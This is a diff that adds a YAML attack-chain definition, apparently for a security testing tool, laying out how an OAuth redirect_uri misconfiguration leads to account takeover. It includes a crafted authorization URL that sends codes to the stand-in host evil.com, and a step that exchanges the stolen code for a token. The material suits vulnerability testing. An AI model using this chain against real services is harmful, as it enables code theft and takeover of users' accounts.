@@ -1,0 +1,20 @@
+id: oauth_to_ato
+name: OAuth Misconfiguration to Account Takeover
+impact: critical
+prerequisites:
+  - open_redirect on redirect_uri parameter
+  - OR weak state parameter validation
+  - OR token leakage via referer
+chain:
+  - step: 1
+    finding: open_redirect_on_oauth
+    description: "OAuth redirect_uri accepts attacker-controlled URLs"
+    test: "Change redirect_uri to https://evil.com and check if code/token is sent"
+  - step: 2
+    action: "Craft malicious OAuth authorization URL"
+    payload: "https://target.com/auth?client_id=X&redirect_uri=https://evil.com&response_type=code"
+  - step: 3
+    result: "Victim clicks link -> authenticates -> code sent to attacker"
+  - step: 4
+    action: "Exchange stolen code for access token"
+    impact: "Full account takeover via OAuth"
